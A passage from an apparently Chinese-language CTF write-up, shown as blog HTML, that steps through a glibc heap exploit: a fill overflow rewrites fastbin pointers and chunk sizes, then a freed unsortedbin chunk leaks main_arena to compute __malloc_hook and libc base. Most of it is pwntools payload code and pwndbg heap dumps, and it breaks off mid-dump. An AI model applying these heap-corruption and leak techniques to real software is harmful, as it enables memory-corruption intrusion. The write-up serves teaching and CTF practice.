class="line">0x555f4fda70f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x555f4fda7120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555f4fda7180: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>两个free的堆块均在fastbins中</p>
<h5 id="填充2号位置，使其指向4号位置"><a href="#填充2号位置，使其指向4号位置" class="headerlink" title="填充2号位置，使其指向4号位置"></a>填充2号位置，使其指向4号位置</h5><p>通过漏洞fill堆溢出，修改块2里指向块1的低地址，修改为0x80，即可使得块2指向块4</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload +=p8(<span class="number">0x80</span>)<span class="comment">#使2的chunk空闲块指向四号块的位置，四号块的位置为较大的chunk，用来获取目标为地址</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50gx 0x557919ada000        </span><br><span class="line">0x557919ada000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada050: 0x0000557919ada080      0x0000000000000000</span><br><span class="line">0x557919ada060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x557919ada070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada080: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x557919ada090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada0f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x557919ada120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x557919ada180: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)<span class="comment">#使四好块的大小变成了0x21，这样四号就意义上被free掉了</span></span><br></pre></td></tr></table></figure>

<p><strong>为绕过检测，修改块4：0x80-&gt;0x10，溢出实现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap     <span class="comment">#修改成功，但是由于chunk4的大小修改了，故找不到topchunk了，故后期需要把大小：0x10-&gt;0x80                                                  </span></span><br><span class="line">Allocated chunk | PREV_INUSE                                       </span><br><span class="line">Addr: 0x56359b821000                                               </span><br><span class="line">Size: 0x21                                                         </span><br><span class="line">                                                                   </span><br><span class="line">Allocated chunk | PREV_INUSE                                       </span><br><span class="line">Addr: 0x56359b821020                                               </span><br><span class="line">Size: 0x21                                                         </span><br><span class="line"><span class="comment">#2                                                                 </span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE                                 </span><br><span class="line">Addr: 0x56359b821040                                               </span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x56359b821080</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56359b821060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x56359b821080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x56359b8210a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x56359b8210c0</span><br><span class="line">Size: 0x2100</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x56359b8231c0</span><br><span class="line">Size: 0x00</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins                                                       </span><br><span class="line">fastbins  <span class="comment">#可以看到fastbin中，二号位置已经指向了4号位置，并且4号位置大小被改为0x21                                                         </span></span><br><span class="line">0x20: 0x56359b821040 —▸ 0x56359b821080 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/50gx 0x56359b821000</span><br><span class="line">0x56359b821000: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821020: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821040: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821050: 0x000056359b821080      0x0000000000000000</span><br><span class="line">0x56359b821060: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821080: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b821090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b8210a0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x56359b8210b0: 0x0000000000000080      0x0000000000000000</span><br><span class="line">0x56359b8210c0: 0x0000000000000000      0x0000000000002100</span><br><span class="line">0x56359b8210d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b8210e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b8210f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821110: 0x0000000000000000      0x0000000000020ef1</span><br><span class="line">0x56359b821120: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821130: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821140: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821150: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821160: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821170: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x56359b821180: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="重新申请空间，将四号位置分配回来"><a href="#重新申请空间，将四号位置分配回来" class="headerlink" title="重新申请空间，将四号位置分配回来"></a>重新申请空间，将四号位置分配回来</h5><p>再申请两块0x21大小的空间，注意，申请第一个时，index&#x3D;1 为原来的2号chunk；申请第二个时，index&#x3D;2，为原来的4号chunk；但我们最终想让4号chunk再次free掉，进入unsorted bin中，因此要将4号chunk大小改回0x91，这样也能让top chunk找到。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x10</span>) <span class="comment"># 申请原本2号块 </span></span><br><span class="line">allo(<span class="number">0x10</span>)	<span class="comment"># 这里就会申请到4号块的位置</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>1、2、4</p>
<p>释放：块1-&gt;块2</p>
<p>修改：块2-&gt;块4</p>
<p>重新申请：块4-&gt;块2（idx1-&gt;idx2）</p>
<p>故</p>
<p>原块1直接释放态-&gt;allocate态</p>
<p>原块2-&gt;idx1</p>
<p>原块4-&gt;idx2</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cdf6b69080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55cdf6b6b1c0</span><br><span class="line">Size: 0x00</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>重新修改chunk4：0x10-&gt;0x80</strong></p>
<p>为了让top chunk重新找得到，故需要重新将chunk4的大小修改回0x80，以便于之后申请操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>) </span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 将4号块的大小改回 0x91,不然找不到top chunk位置 </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077000</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077020</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#new 1</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077040</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#2，4</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x559e88077110</span><br><span class="line">Size: 0x20ef1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x559e88077000</span><br><span class="line">0x559e88077000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e88077070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x559e88077090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e880770a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559e880770b0:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x559e880770c0:	0x0000000000000000	0x0000000000002100</span><br><span class="line">0x559e880770d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e880770e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e880770f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x559e88077120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559e88077180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>申请一个块，防止块4free与top chunk合并</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allo(0x80)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d110</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55cf4877d1a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x55cf4877d000</span><br><span class="line">0x55cf4877d000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55cf4877d090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d0a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55cf4877d0b0:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x55cf4877d0c0:	0x0000000000000000	0x0000000000002100</span><br><span class="line">0x55cf4877d0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d110:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55cf4877d120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55cf4877d180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h5 id="free-4"><a href="#free-4" class="headerlink" title="free(4)"></a>free(4)</h5><p>此时已经存在两个index指向一个chunk。一个是最开始申请的index&#x3D;4，一个是后边再重新申请的index&#x3D;2，这时free(4),4号chunk的fd和bk变成了main+arena+88地址，_malloc_hook&#x3D;main_arena-0x10</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)    <span class="comment"># 释放4号块 </span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> </span><br><span class="line">libc_base = __malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>] <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base)) </span><br></pre></td></tr></table></figure>

<p>打印idx2(即idx4内容)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#free(4)</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca080</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7f46cb771b78</span><br><span class="line">bk: 0x7f46cb771b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55a48aeca110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55a48aeca1a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55a48aeca080 —▸ 0x7f46cb771b78 (main_arena+88) ◂— 0x55a48aeca080</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x55a48aeca000</span><br><span class="line">0x55a48aeca000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55a48aeca090:	0x00007f46cb771b78	0x00007f46cb771b78</span><br><span class="line">0x55a48aeca0a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55a48aeca0b0:	0x0000000000000080	0x0000000000000000</span><br><span class="line">0x55a48aeca0c0:	0x0000000000000000	0x0000000000002100</span><br><span class="line">0x55a48aeca0d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca0f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca110:	0x0000000000000090	0x0000000000000090</span><br><span class="line">0x55a48aeca120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55a48aeca180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] __malloc_hook: 0x7f46cb771b10 </span><br><span class="line">[*] libc_base: 0x7f46cb3ad000 </span><br></pre></td></tr></table></figure>

<h5 id="切割4号块"><a href="#切割4号块" class="headerlink" title="切割4号块"></a>切割4号块</h5><p>将四号块切割，使得一部分块放入fastbin中，这样才便于利用</p>
<p><strong>申请0x60空间</strong></p>
<p> 新块的idx为4（把idx4给了分配的块，因为分配的0x21没有idx）      </p>
<p> 切割0x91的块，剩下0x21放入了unsortedbin中 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allo(<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc8080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc80f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f3275391b78</span><br><span class="line">bk: 0x7f3275391b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55f4d9dc8110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55f4d9dc81a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55f4d9dc80f0 —▸ 0x7f3275391b78 (main_arena+88) ◂— 0x55f4d9dc80f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/50gx 0x55f4d9dc8000</span><br><span class="line">0x55f4d9dc8000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x55f4d9dc8090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc80f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55f4d9dc8100:	0x00007f3275391b78	0x00007f3275391b78</span><br><span class="line">0x55f4d9dc8110:	0x0000000000000020	0x0000000000000090</span><br><span class="line">0x55f4d9dc8120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55f4d9dc8180:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>释放0x60的块</strong></p>
<p>再次释放0x60的块，放入了fastbin中，为fastbin后面继续申请0x60的堆地址提供了帮助</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05060</span><br><span class="line">Size: 0x21</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb05080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb050f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f66aa6bfb78</span><br><span class="line">bk: 0x7f66aa6bfb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5563feb05110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5563feb051a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span 